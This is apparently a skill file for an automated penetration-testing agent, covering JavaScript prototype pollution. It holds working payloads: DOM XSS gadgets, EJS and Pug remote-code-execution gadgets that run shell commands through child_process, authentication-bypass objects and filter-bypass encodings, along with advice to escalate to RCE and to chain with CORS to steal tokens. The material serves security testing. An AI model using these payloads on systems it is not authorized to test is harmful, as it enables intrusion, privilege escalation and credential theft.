---
name: prototype_pollution
description: Prototype pollution testing covering client-side DOM XSS, server-side Node.js RCE, gadget chains, and authentication bypass
---

# Prototype Pollution

Prototype pollution occurs when user-controlled input is merged into a JavaScript object in a way that modifies `Object.prototype`. Every object in JavaScript inherits from `Object.prototype` — polluting it injects properties into all objects in the runtime. Client-side PP leads to XSS; server-side PP in Node.js leads to RCE via template engine gadgets.

## Attack Surface

**Client-Side**
- URL query parameters: `?__proto__[x]=y`
- Hash fragments: `#__proto__[x]=y`
- JSON request bodies parsed with vulnerable merge libraries
- `jQuery.extend(true, ...)`, `_.merge()`, `lodash.defaultsDeep()`, `Object.assign` (shallow only — not vulnerable)

**Server-Side (Node.js)**
- JSON body parsing with deep merge: express + body-parser + lodash/deepmerge
- `qs` library parsing nested query strings: `?__proto__[x]=y`
- MongoDB Mongoose options objects
- Template engine options objects (Handlebars, EJS, Pug)

**Vulnerable Libraries**
- `lodash < 4.17.21` — `_.merge`, `_.set`, `_.defaultsDeep`
- `jquery < 3.4.0` — `$.extend(true, ...)`
- `deepmerge < 4.2.2`
- `mpath < 0.8.4` (MongoDB path resolution)
- `minimist < 1.2.6`

## Detection

**Client-Side Detection**
Inject via URL query parameter and verify via browser console:
```
https://target.com/?__proto__[testPP]=polluted
// In browser console:
({}).testPP   // → "polluted" = VULNERABLE
```

Also test via hash:
```
https://target.com/#__proto__[testPP]=polluted
```

Using browser `execute_js` action:
```javascript
// Check if already polluted
({}).testPP
// If undefined, inject via fetch/XHR and check again
```

**Server-Side Detection**
Send JSON body with `__proto__` key:
```json
{"__proto__": {"testPP": "polluted"}}
{"constructor": {"prototype": {"testPP": "polluted"}}}
```
Look for reflected property in response, error revealing the property, or behavior change.

**Using `constructor.prototype` alternative:**
```json
{"constructor": {"prototype": {"testPP": "polluted"}}}
```

## Key Vulnerabilities

### Client-Side PP → XSS via DOM Gadgets

After polluting a property, look for DOM gadgets — code that reads from `Object.prototype` and uses the value in a dangerous sink.

Common gadgets:
```javascript
// innerHTML sink via polluted property
element.innerHTML = options.template || ''   // pollute: __proto__[template]=<img src=x onerror=alert(1)>

// src attribute
img.src = config.iconUrl                     // pollute: __proto__[iconUrl]=javascript:alert(1)

// eval/Function sink
new Function(options.code)()                 // pollute: __proto__[code]=alert(1)

// jQuery html()
$(elem).html(options.content)                // pollute: __proto__[content]=<script>alert(1)</script>
```

Use `inject_init_script` browser action to install a pollution detector:
```javascript
const handler = {set(t,k,v){console.log('PP SINK:',k,v,new Error().stack); return Reflect.set(t,k,v);}};
Object.setPrototypeOf({}, new Proxy(Object.prototype, handler));
```

### Server-Side PP → RCE via Template Engine Gadgets

**EJS gadget (express-ejs-layouts / ejs):**
```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"}}
```

**Handlebars gadget:**
```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "PathExpression", "parts": ["process"]}}]}}
```

**Pug gadget:**
```json
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}
```

**Node.js child_process via `options.shell`:**
```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/fd/0"}}
```

### Authentication Bypass

Pollute properties used in authorization checks:
```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"role": "admin"}}
{"__proto__": {"authenticated": true}}
{"__proto__": {"permissions": ["admin"]}}
```

Works when server code does:
```javascript
if (user.isAdmin) { ... }  // user.isAdmin is undefined → polluted to true
```

### NoSQL Injection via PP

Mongoose queries inherit polluted prototype options:
```json
{"__proto__": {"skipValidation": true}}
```

## Bypass Techniques

**`constructor.prototype` Alternative**
When `__proto__` is filtered:
```json
{"constructor": {"prototype": {"x": "polluted"}}}
```
URL-encoded: `constructor[prototype][x]=polluted`

**URL Encoding**
```
?__proto__[x]=y  →  ?%5F%5Fproto%5F%5F[x]=y
```

**Nested Object Path**
```json
{"a": {"__proto__": {"x": "polluted"}}}
```

## Tools

- **ppmap** — Automated client-side gadget scanner: `npx ppmap --url "https://target.com"`
- **semgrep** — Static detection: `semgrep --config=p/javascript` (finds unsafe merge patterns)
- **nuclei** — PP templates: `nuclei -t nuclei-templates/vulnerabilities/generic/prototype-pollution*`
- **Browser `inject_init_script`** — Install PP detector before page JS runs
- **Browser `execute_js`** — Test `({}).testPP` after navigation to confirm client-side PP

## Testing Methodology

1. Check `package.json` for vulnerable library versions (`lodash < 4.17.21`, `jquery < 3.4.0`, `deepmerge < 4.2.2`)
2. Client-side: inject `?__proto__[strixPP]=polluted` in URL, run `({}).strixPP` in console via `execute_js`
3. Use `inject_init_script` to install pollution detector before page load; navigate the application and watch for sink triggers
4. Server-side: send `{"__proto__": {"strixPP": "polluted"}}` in JSON body to all POST/PUT/PATCH endpoints; check if any response reflects the property or changes behavior
5. Test `constructor.prototype` path as alternative to `__proto__`
6. If injection confirmed: escalate — test authentication bypass payloads, then template engine RCE gadgets
7. For RCE: use `interactsh-client` OOB callback to confirm blind execution
8. Document: injection point, property name, client-side gadget chain or server-side RCE payload, full PoC

## Pro Tips

- PP is often present but unexploited — the hard part is finding gadgets, not the injection itself
- `inject_init_script` is the most powerful tool here: it lets you see what properties the page reads from `Object.prototype` BEFORE any page JavaScript runs
- Grep source code for `.merge(`, `.extend(true,`, `defaultsDeep(`, `set(obj,` — these are the dangerous patterns
- When `__proto__` is in the URL, many WAFs and parsers strip it — try `constructor[prototype]` first in production
- The EJS gadget (`outputFunctionName`) works on a huge number of Node.js apps — it's the most reliable server-side RCE chain
- Combine with CORS: PP on the client side to steal tokens, CORS to exfiltrate them
